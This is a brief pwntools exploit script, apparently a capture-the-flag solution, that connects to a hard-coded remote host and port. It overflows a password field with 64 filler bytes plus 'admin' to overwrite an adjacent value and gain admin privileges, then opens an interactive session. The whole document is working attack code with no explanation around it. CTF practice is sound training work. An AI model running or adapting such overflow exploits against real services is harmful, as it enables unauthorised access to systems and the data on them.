from pwn import *

context.binary = exe = ELF('./pwn')

io = remote('139.180.137.100', 1337)

io.sendlineafter(b'Exit\n', b'2')
io.sendlineafter(b'username:\n', b'a')
io.sendlineafter(b'passwd:\n', b'a'*64+b'admin')
io.sendlineafter(b'Exit\n', b'4')
io.interactive()